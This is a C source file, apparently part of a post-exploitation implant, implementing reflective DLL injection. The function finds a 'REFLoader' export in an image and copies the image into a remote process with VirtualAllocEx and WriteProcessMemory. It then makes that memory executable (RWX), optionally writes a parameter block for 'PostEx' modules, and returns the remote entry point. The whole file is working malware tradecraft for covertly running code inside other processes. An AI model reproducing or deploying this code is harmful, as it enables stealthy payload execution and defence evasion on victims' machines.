#include "inject_internal.h"

/* 准备 reflective 映像：写入远程内存、设置权限、定位入口和可选参数块。 */
BOOL InjectPrepareReflective(const InjectRequest* req,
                             InjectResult* result,
                             CHAR* err,
                             SIZE_T err_size)
{
    DWORD loader_raw = 0;
    PBYTE image = NULL;
    PVOID parameter = NULL;
    SIZE_T wrote = 0;
    DWORD old_protect = 0;
    const CHAR* image_label;
    const CHAR* parameter_label;
    const CHAR* entry_export;

    if (result) InjectResultInit(result);
    if (err && err_size) err[0] = '\0';

    image_label = req && req->image_label ? req->image_label : "image";
    parameter_label = req && req->parameter_label ? req->parameter_label : "parameter";
    entry_export = req && req->entry_export ? req->entry_export : "REFLoader";

    /* 这里只负责远程映像准备；目标进程创建/打开由调用方当前阶段负责。 */
    if (!req || !result || !req->process || !req->image ||
        !req->image->data || req->image->len < sizeof(IMAGE_DOS_HEADER)) {
        if (err) strcpy_s(err, err_size,
                          req && req->invalid_request_error ?
                          req->invalid_request_error :
                          "invalid reflective inject request");
        return FALSE;
    }

    if (!InjectFindExportRawOffset(req->image->data, req->image->len,
                                   entry_export, req->required_machine,
                                   &loader_raw)) {
        if (err) strcpy_s(err, err_size,
                          req->missing_export_error ?
                          req->missing_export_error :
                          "reflective image missing entry export");
        return FALSE;
    }

    image = (PBYTE)VirtualAllocEx(req->process, NULL, req->image->len,
                                  MEM_RESERVE | MEM_COMMIT,
                                  PAGE_READWRITE);
    if (!image) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "VirtualAllocEx(%s) failed: %lu",
                             image_label, (unsigned long)GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(req->process, image, req->image->data,
                            req->image->len, &wrote) ||
        wrote != req->image->len) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "WriteProcessMemory(%s) failed: %lu",
                             image_label, (unsigned long)GetLastError());
        VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!VirtualProtectEx(req->process, image, req->image->len,
                          PAGE_EXECUTE_READWRITE, &old_protect)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "VirtualProtectEx(%s) failed: %lu",
                             image_label, (unsigned long)GetLastError());
        VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
        return FALSE;
    }
    FlushInstructionCache(req->process, image, req->image->len);

    /* 参数块可选：Migrate 不需要，PostEx 用它传入远程配置。 */
    if (req->parameter && req->parameter_size) {
        parameter = VirtualAllocEx(req->process, NULL, req->parameter_size,
                                   MEM_RESERVE | MEM_COMMIT,
                                   PAGE_READWRITE);
        if (!parameter) {
            if (err) _snprintf_s(err, err_size, _TRUNCATE,
                                 "VirtualAllocEx(%s) failed: %lu",
                                 parameter_label,
                                 (unsigned long)GetLastError());
            VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
            return FALSE;
        }

        if (!WriteProcessMemory(req->process, parameter, req->parameter,
                                req->parameter_size, &wrote) ||
            wrote != req->parameter_size) {
            if (err) _snprintf_s(err, err_size, _TRUNCATE,
                                 "WriteProcessMemory(%s) failed: %lu",
                                 parameter_label,
                                 (unsigned long)GetLastError());
            VirtualFreeEx(req->process, parameter, 0, MEM_RELEASE);
            VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
            return FALSE;
        }
    }

    result->remote_image = image;
    result->remote_image_size = req->image->len;
    result->remote_parameter = parameter;
    result->remote_parameter_size = req->parameter_size;
    result->remote_entry = image + loader_raw;
    return TRUE;
}
